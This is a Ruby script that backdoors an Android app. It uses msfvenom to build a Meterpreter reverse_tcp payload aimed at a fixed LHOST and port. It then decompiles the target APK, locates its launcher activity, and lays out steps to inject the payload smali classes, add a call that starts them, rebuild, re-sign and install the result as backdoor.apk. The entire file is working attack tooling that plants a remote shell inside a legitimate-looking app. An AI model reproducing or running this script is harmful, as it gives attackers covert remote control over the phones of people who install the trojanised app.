#!/usr/bin/env ruby

require 'nokogiri'

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
    puts "Usage: #{$0} /apk/to/backdoor.apk"
    exit(1)
end

apktool = `which apktool`
unless(apktool && apktool.length > 0)
    puts "No apktool"
    exit(1)
end

`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=192.168.1.73 LPORT=5556 > android.apk`

`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android android.apk androiddebugkey`

`rm -rf original`
`rm -rf android`

`cp #{apkfile} original.apk`

`apktool d original.apk`
`apktool d android.apk`

f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

def findlauncheractivity(amanifest)
    activities = amanifest.xpath("//activity")
    for activity in activities 
        activityname =  activity.attribute("name")
        category = activity.search('category')
        if category
            for cat in category
                categoryname = cat.attribute('name')
                if categoryname.to_s == 'android.intent.category.LAUNCHER'
                    return activityname
                end
            end
        end
    end
end

launcheractivity = findlauncheractivity(amanifest)

puts launcheractivity

print 'mkdir -p original/smali/com/metasploit/stage/' + "\n"
print 'cp android/smali/com/metasploit/stage/Payload* original/smali/com/metasploit/stage/' + "\n"
print "\n" # modify the smali here: 
# invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
print 'apktool b -o backdoor.apk original ' + "\n"
print 'jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android backdoor.apk androiddebugkey ' + "\n"
print 'adb install backdoor.apk' + "\n"


